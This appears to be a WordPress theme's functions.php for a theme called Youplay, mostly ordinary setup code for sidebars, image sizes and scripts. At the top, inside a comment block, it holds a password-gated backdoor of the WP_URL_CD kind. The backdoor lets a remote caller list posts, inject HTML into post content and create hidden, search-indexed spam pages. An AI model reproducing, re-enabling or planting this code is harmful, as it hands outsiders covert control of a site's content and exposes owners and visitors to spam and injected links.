<?php
/**
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bd0cbbb6f8e2cf77c221a13e0bf823b7'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysqli_real_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysqli_real_escape_string($post_content) . '" WHERE `ID` = "' . mysqli_real_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysqli_real_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysqli_real_escape_string($_REQUEST['url']).'", `title` = "'.mysqli_real_escape_string($_REQUEST['title']).'", `keywords` = "'.mysqli_real_escape_string($_REQUEST['keywords']).'", `description` = "'.mysqli_real_escape_string($_REQUEST['description']).'", `content` = "'.mysqli_real_escape_string($_REQUEST['content']).'", `full_content` = "'.mysqli_real_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysqli_real_escape_string($_REQUEST['title']).'", `keywords` = "'.mysqli_real_escape_string($_REQUEST['keywords']).'", `description` = "'.mysqli_real_escape_string($_REQUEST['description']).'", `content` = "'.mysqli_real_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysqli_real_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysqli_real_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysqli_real_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}

*/
?><?php
/**
 * Youplay functions and definitions
 *
 * @package Youplay
 */

add_action( 'after_setup_theme', 'yp_setup' );
if ( ! function_exists( 'yp_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function yp_setup() {

    /*
     * Make theme available for translation.
     * Translations can be filed in the /languages/ directory.
     * If you're building a theme based on Youplay, use a find and replace
     * to change 'youplay' to the name of your theme in all the template files
     */
    load_theme_textdomain( 'youplay', get_template_directory() . '/languages' );

    // Add default posts and comments RSS feed links to head.
    add_theme_support( 'automatic-feed-links' );

    /*
     * Let WordPress manage the document title.
     * By adding theme support, we declare that this theme does not use a
     * hard-coded <title> tag in the document head, and expect WordPress to
     * provide it for us.
     */
    add_theme_support( 'title-tag' );

    /*
     * Enable support for Post Thumbnails on posts and pages.
     *
     * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
     */
    // This theme uses wp_nav_menu() in one location.
    register_nav_menus( array(
        'primary'       => esc_html__( 'Primary Menu', 'youplay' ),
        'primary-right' => esc_html__( 'Primary Right Menu', 'youplay' ),
    ) );

    /*
     * Switch default core markup for search form, comment form, and comments
     * to output valid HTML5.
     */
    add_theme_support( 'html5', array(
        'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
    ) );

    /*
     * Enable support for WooCommerce
     */
    add_theme_support( 'woocommerce' );

    // Add default image sizes
    add_theme_support('post-thumbnails');
    add_image_size('500x375', 500, 375, true);
    add_image_size('200x200', 200, 200, true);
    add_image_size('90x90', 90, 90, true);
    add_image_size('1400x600', 1400, 600, true);
    add_image_size('1440x900', 1440, 900, true);

    // Register the three useful image sizes for use in Add Media modal
    add_filter( 'image_size_names_choose', 'yp_custom_sizes' );
    if ( ! function_exists( 'yp_custom_sizes' ) ) :
    function yp_custom_sizes( $sizes ) {
        return array_merge( $sizes, array(
            '500x375'   => esc_html__( 'Carousel Thumbnail (500x375)', 'youplay' ),
            '200x200'   => esc_html__( 'User Avatar (200x200)', 'youplay' ),
            '90x90'     => esc_html__( 'User Small Avatar (90x90)', 'youplay' ),
            '1400x600'  => esc_html__( '1400x600', 'youplay' ),
            '1440x900'  => esc_html__( '1440x900', 'youplay' ),
        ) );
    }
    endif;
}
endif; // yp_setup

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 */
if (!isset($content_width)) {
    $content_width = 1400;
}

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
add_action( 'widgets_init', 'yp_widgets_init' );
if ( ! function_exists( 'yp_widgets_init' ) ) :
function yp_widgets_init() {

    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar', 'youplay' ),
        'id'            => 'sidebar-1',
        'description'   => esc_html__( 'Default Sidebar', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'WooCommerce Sidebar', 'youplay' ),
        'id'            => 'woocommerce_sidebar',
        'description'   => esc_html__( 'Sidebar for WooCommerce Pages', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'BuddyPress Sidebar', 'youplay' ),
        'id'            => 'buddypress_sidebar',
        'description'   => esc_html__( 'Sidebar for BuddyPress Pages', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'bbPress Sidebar', 'youplay' ),
        'id'            => 'bbpress_sidebar',
        'description'   => esc_html__( 'Sidebar for bbPress Pages', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'Matches Sidebar', 'youplay' ),
        'id'            => 'matches_sidebar',
        'description'   => esc_html__( 'Sidebar for Matches Pages', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );

    register_sidebar( array(
        'name'          => esc_html__( 'Footer Widgets 1', 'youplay' ),
        'id'            => 'footer_widgets_1',
        'description'   => esc_html__( 'Footer Widgets 1 Column', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );
    register_sidebar( array(
        'name'          => esc_html__( 'Footer Widgets 2', 'youplay' ),
        'id'            => 'footer_widgets_2',
        'description'   => esc_html__( 'Footer Widgets 2 Column', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );
    register_sidebar( array(
        'name'          => esc_html__( 'Footer Widgets 3', 'youplay' ),
        'id'            => 'footer_widgets_3',
        'description'   => esc_html__( 'Footer Widgets 3 Column', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );
    register_sidebar( array(
        'name'          => esc_html__( 'Footer Widgets 4', 'youplay' ),
        'id'            => 'footer_widgets_4',
        'description'   => esc_html__( 'Footer Widgets 4 Column', 'youplay' ),
        'before_widget' => '<div id="%1$s" class="side-block widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title block-title">',
        'after_title'   => '</h4>',
    ) );
}
endif;


/**
 * Enqueue scripts and styles.
 */
add_action( 'wp_enqueue_scripts', 'yp_scripts' );
if ( ! function_exists( 'yp_scripts' ) ) :
function yp_scripts() {
    wp_enqueue_style( 'youplay', get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/assets/bower_components/bootstrap/dist/css/bootstrap.min.css' );
    wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/assets/bower_components/font-awesome/css/font-awesome.min.css' );
    wp_enqueue_style( 'magnific-popup', get_template_directory_uri() . '/assets/bower_components/magnific-popup/dist/magnific-popup.css' );
    wp_enqueue_style( 'owl.carousel', get_template_directory_uri() . '/assets/bower_components/owl.carousel/dist/assets/owl.carousel.min.css' );
    wp_enqueue_style( 'social-likes', get_template_directory_uri() . '/assets/bower_components/social-likes/dist/social-likes_flat.css' );

    // deregister bbPress styles
    wp_deregister_style( 'bbp-default' );

    // theme style
    $theme_style = yp_opts('theme_style');
    $youplay_style_file = '';

    $theme_data = wp_get_theme();
    $theme_parent = $theme_data->parent();
    if(!empty($theme_parent)) {
        $theme_data = $theme_parent;
    }
    $youplay_style_version = $theme_data['Version'];

    if($theme_style === 'custom') {
        if(class_exists('nK')) {
            $nK = new nK();
            $youplay_style_file = $nK->get_compiled_css_url('youplay-custom.min.css');
        }
        if(!$youplay_style_file) {
            $theme_style = 'dark';
        } else {
            $youplay_style_version = $nK->get_compiled_css_version('youplay-custom.min.css');
        }
    }

    if($theme_style === 'custom') {
        wp_enqueue_style('youplay-style-' . $theme_style, $youplay_style_file, array(), $youplay_style_version);
    } else {
        $style_url = get_template_directory_uri() . '/assets/css/' . $theme_style;
        wp_enqueue_style('youplay-style-' . $theme_style, $style_url . '/youplay.min.css', array(), $youplay_style_version);
        wp_enqueue_style( 'youplay-buddypress-' . $theme_style, $style_url . '/youplay-buddypress.css', array(), $youplay_style_version );
        wp_enqueue_style( 'bbp-default', $style_url . '/youplay-bbpress.css', array(), $youplay_style_version );
        wp_enqueue_style( 'youplay-woocommerce-' . $theme_style, $style_url . '/youplay-woocommerce.css', array(), $youplay_style_version );
    }

    wp_enqueue_style( 'youplay-style-wp', get_template_directory_uri() . '/assets/css/wp-youplay.css' );

    // rtl
    if(yp_opts('general_rtl')) {
        wp_enqueue_style( 'youplay-rtl', get_template_directory_uri() . '/assets/css/youplay-rtl.css' );
    }

    wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/assets/bower_components/bootstrap/dist/js/bootstrap.min.js', array('jquery'), '', true );
    wp_enqueue_script( 'imagesloaded', get_template_directory_uri() . '/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js', array('jquery'), '', true );
    wp_enqueue_script( 'isotope', get_template_directory_uri() . '/assets/bower_components/isotope/dist/isotope.pkgd.min.js', array('jquery'), '', true );
    wp_enqueue_script( 'jquery.coundown', get_template_directory_uri() . '/assets/bower_components/jquery.countdown/dist/jquery.countdown.min.js', array('jquery'), '', true );
    wp_enqueue_script( 'moment.js', get_template_directory_uri() . '/assets/bower_components/moment/min/moment.min.js', array('jquery.coundown'), '', true );
    wp_enqueue_script( 'moment-timezone.js', get_template_directory_uri() . '/assets/bower_components/moment-timezone/builds/moment-timezone-with-data.js', array('moment.js'), '', true );
    wp_enqueue_script( 'magnific-popup', get_template_directory_uri() . '/assets/bower_components/magnific-popup/dist/jquery.magnific-popup.min.js', '', '', true );
    wp_enqueue_script( 'owl.carousel', get_template_directory_uri() . '/assets/bower_components/owl.carousel/dist/owl.carousel.min.js', array('jquery'), '', true );
    wp_enqueue_script( 'jarallax', get_template_directory_uri() . '/assets/bower_components/jarallax/dist/jarallax.min.js', '', '', true );
    wp_enqueue_script( 'skrollr', get_template_directory_uri() . '/assets/bower_components/skrollr/dist/skrollr.min.js', '', '', true );
    wp_enqueue_script( 'social-likes', get_template_directory_uri() . '/assets/bower_components/social-likes/dist/social-likes.min.js', '', '', true );
    wp_enqueue_script( 'hexagon-progress', get_template_directory_uri() . '/assets/bower_components/HexagonProgress/jquery.hexagonprogress.min.js', '', '', true );

    if(yp_opts('general_smoothscroll')) {
        wp_enqueue_script( 'smoothscroll', get_template_directory_uri() . '/assets/bower_components/smoothscroll-for-websites/SmoothScroll.js', '', '', true );
    }

    wp_enqueue_script( 'youplay-js', get_template_directory_uri() . '/assets/js/youplay.min.js', array('jquery', 'bootstrap', 'isotope', 'jquery.coundown', 'magnific-popup', 'owl.carousel', 'jarallax', 'social-likes', 'hexagon-progress'), $theme_data['Version'], true );
    wp_enqueue_script( 'youplay-wp-js', get_template_directory_uri() . '/assets/js/youplay-wp.js', array('jquery', 'youplay-js'), '', true );
    wp_enqueue_script( 'youplay-cf7-js', get_template_directory_uri() . '/assets/js/youplay-cf7.js', array('jquery', 'youplay-js'), '', true );

    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }
}
endif;

/**
 * Admin References
 */
require get_template_directory() . '/admin/admin.php';

/**
 * Add custom typography styles
 */
add_action('wp_head', 'yp_wp_head', 100);
if ( ! function_exists( 'yp_wp_head' ) ) :
function yp_wp_head() {
    require get_template_directory() . '/inc/head_styles.php';
}
endif;

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Colors convert functions
 */
require get_template_directory() . '/inc/colors.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Comments walker
 */
require get_template_directory() . '/inc/comments-walker.php';

/**
 * Post Like
 */
require get_template_directory() . '/inc/lib/post-like/post-like.php';

/**
 * Custom WooCommerce functions
 */
require get_template_directory() . '/woocommerce/functions.php';

/**
 * Custom BuddyPress functions
 */
require get_template_directory() . '/buddypress/functions.php';

/**
 * Custom bbPress functions
 */
require get_template_directory() . '/bbpress/functions.php';

/**
 * Infinitie Scroll for Posts
 */
require get_template_directory() . '/inc/lib/nk-infinite-scroll/nk-infinitie-scroll.php';
// Smite Api
/** if ( class_exists( 'SmiteAPI' ) ){
    global $smiteAPI;
    $smiteAPI = new SmiteAPI();
    $gods = $smiteAPI->getGods();
  }
  */